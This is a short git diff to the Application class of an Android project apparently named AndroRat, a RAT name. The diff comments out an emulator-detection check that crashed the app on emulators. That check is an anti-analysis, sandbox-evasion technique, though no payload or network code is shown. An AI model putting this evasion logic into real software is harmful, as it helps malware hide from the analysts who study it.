@@ -8,8 +8,6 @@ import android.os.LocaleList
 import androidx.appcompat.app.AppCompatDelegate
 import androidx.core.os.LocaleListCompat
 import com.ierusalem.androrat.core.data.preferences.DataStorePreferenceRepository
-import com.ierusalem.androrat.core.emulator_detection.EmulatorDetector
-import com.ierusalem.androrat.core.utils.log
 import dagger.hilt.android.HiltAndroidApp
 import kotlinx.coroutines.DelicateCoroutinesApi
 import kotlinx.coroutines.Dispatchers
@@ -27,11 +25,11 @@ class AndroRatApp: Application() {
     override fun onCreate() {
         super.onCreate()
 
-        val isRunningOnEmulatorDetector = EmulatorDetector.isRunningOnEmulator()
-        if (isRunningOnEmulatorDetector != null && isRunningOnEmulatorDetector) {
-            log("Emulator detected!")
-            throw IllegalStateException("Mobile Device Required!")
-        }
+//        val isRunningOnEmulatorDetector = EmulatorDetector.isRunningOnEmulator()
+//        if (isRunningOnEmulatorDetector != null && isRunningOnEmulatorDetector) {
+//            log("Emulator detected!")
+//            throw IllegalStateException("Mobile Device Required!")
+//        }
 
         GlobalScope.launch {
             dataStorePreferenceRepository.getLanguage.collect { languageCode ->
